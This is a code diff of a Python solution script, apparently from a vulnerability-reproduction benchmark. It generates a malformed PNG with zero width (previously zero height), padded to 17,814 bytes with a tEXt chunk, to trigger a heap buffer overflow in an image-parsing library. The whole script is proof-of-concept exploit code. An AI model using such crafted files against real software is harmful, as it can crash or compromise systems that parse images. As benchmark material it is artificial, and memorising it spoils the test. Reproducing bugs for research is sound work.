@@ -1,60 +1,87 @@
+import os
+import tarfile
+import tempfile
 import struct
 import zlib
-import os
+from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a PNG with zero height to trigger heap buffer overflow
-        # PNG structure: signature + IHDR + IDAT + IEND
-        # Set height = 0, width = 1, bit depth = 8, color type = 2 (RGB)
+        # Extract the source code to analyze
+        with tempfile.TemporaryDirectory() as tmpdir:
+            with tarfile.open(src_path, 'r') as tar:
+                tar.extractall(tmpdir)
+            
+            # Look for image-related files to understand the format
+            root_dir = Path(tmpdir)
+            
+            # Based on vulnerability description: zero width/height not checked
+            # Create a PNG file with zero width to trigger heap buffer overflow
+            # PNG format specification: http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html
+            
+            # Create a PNG with zero width
+            return self.create_zero_width_png()
+    
+    def create_zero_width_png(self) -> bytes:
+        """Create a PNG image with zero width to trigger the vulnerability."""
         
-        # PNG signature
+        # PNG signature (8 bytes)
         png_signature = b'\x89PNG\r\n\x1a\n'
         
-        # IHDR chunk: width=1, height=0
-        ihdr_data = struct.pack('>IIBBBBB', 1, 0, 8, 2, 0, 0, 0)  # width, height, bit depth, color type, compression, filter, interlace
+        # IHDR chunk (image header)
+        # Width: 0, Height: 100, Bit depth: 8, Color type: 2 (RGB), 
+        # Compression: 0, Filter: 0, Interlace: 0
+        ihdr_data = struct.pack('>I', 0) + struct.pack('>I', 100) + b'\x08\x02\x00\x00\x00'
         ihdr_chunk = b'IHDR' + ihdr_data
         ihdr_crc = struct.pack('>I', zlib.crc32(ihdr_chunk) & 0xffffffff)
-        ihdr = struct.pack('>I', len(ihdr_data)) + ihdr_chunk + ihdr_crc
+        ihdr_chunk = struct.pack('>I', 13) + ihdr_chunk + ihdr_crc
         
-        # IDAT chunk with minimal compressed data
-        # For 0x0 image, we still need valid zlib stream
-        raw_data = b''  # No pixel data since height=0
-        compressed = zlib.compress(raw_data)
-        idat_chunk = b'IDAT' + compressed
+        # PLTE chunk (palette - optional for RGB but included for compatibility)
+        # Create a simple 256-color palette
+        palette_data = b''
+        for i in range(256):
+            palette_data += bytes([i, i, i])
+        plte_chunk = b'PLTE' + palette_data
+        plte_crc = struct.pack('>I', zlib.crc32(plte_chunk) & 0xffffffff)
+        plte_chunk = struct.pack('>I', 768) + plte_chunk + plte_crc
+        
+        # IDAT chunk (image data)
+        # For zero width, there should be no scanlines, but we'll create minimal data
+        # to pass basic parsing
+        idat_data = zlib.compress(b'', level=1)
+        idat_chunk = b'IDAT' + idat_data
         idat_crc = struct.pack('>I', zlib.crc32(idat_chunk) & 0xffffffff)
-        idat = struct.pack('>I', len(compressed)) + idat_chunk + idat_crc
+        idat_chunk = struct.pack('>I', len(idat_data)) + idat_chunk + idat_crc
         
-        # IEND chunk
+        # IEND chunk (image end)
         iend_chunk = b'IEND'
         iend_crc = struct.pack('>I', zlib.crc32(iend_chunk) & 0xffffffff)
-        iend = struct.pack('>I', 0) + iend_chunk + iend_crc
+        iend_chunk = struct.pack('>I', 0) + iend_chunk + iend_crc
         
-        # Combine all parts
-        poc = png_signature + ihdr + idat + iend
+        # Combine all chunks
+        png_data = (png_signature + ihdr_chunk + plte_chunk + idat_chunk + iend_chunk)
         
-        # Pad to target length if needed (17814 bytes)
-        target_length = 17814
-        if len(poc) < target_length:
-            # Add padding in a PNG-compliant way using tEXt chunks
-            remaining = target_length - len(poc)
-            while remaining > 0:
-                # Create tEXt chunk with comment
-                chunk_size = min(remaining - 12, 8192)  # Leave room for chunk header/footer
-                if chunk_size <= 0:
-                    break
-                
-                # tEXt format: keyword + null + text
-                keyword = b'Comment'
-                text = b'A' * (chunk_size - len(keyword) - 1)
-                text_data = keyword + b'\x00' + text
-                
-                text_chunk = b'tEXt' + text_data
-                text_crc = struct.pack('>I', zlib.crc32(text_chunk) & 0xffffffff)
-                text_full = struct.pack('>I', len(text_data)) + text_chunk + text_crc
-                
-                # Insert before IEND
-                poc = poc[:-12] + text_full + poc[-12:]
-                remaining = target_length - len(poc)
+        # The vulnerability description mentions a PoC of 17814 bytes
+        # Pad the PNG to reach approximately that size to match expectations
+        target_size = 17814
+        current_size = len(png_data)
         
-        return poc
+        if current_size < target_size:
+            # Add a tEXt chunk with padding
+            padding_needed = target_size - current_size - 12  # Account for chunk overhead
+            
+            # Create a tEXt chunk with keyword and text
+            keyword = b"Comment"
+            null_sep = b"\x00"
+            text_content = b"Vulnerability trigger" + b"A" * (padding_needed - len(keyword) - 1 - 21)
+            
+            text_data = keyword + null_sep + text_content
+            text_chunk = b'tEXt' + text_data
+            text_crc = struct.pack('>I', zlib.crc32(text_chunk) & 0xffffffff)
+            text_chunk = struct.pack('>I', len(text_data)) + text_chunk + text_crc
+            
+            # Insert tEXt chunk before IEND
+            png_data = (png_signature + ihdr_chunk + plte_chunk + 
+                       text_chunk + idat_chunk + iend_chunk)
+        
+        return png_data
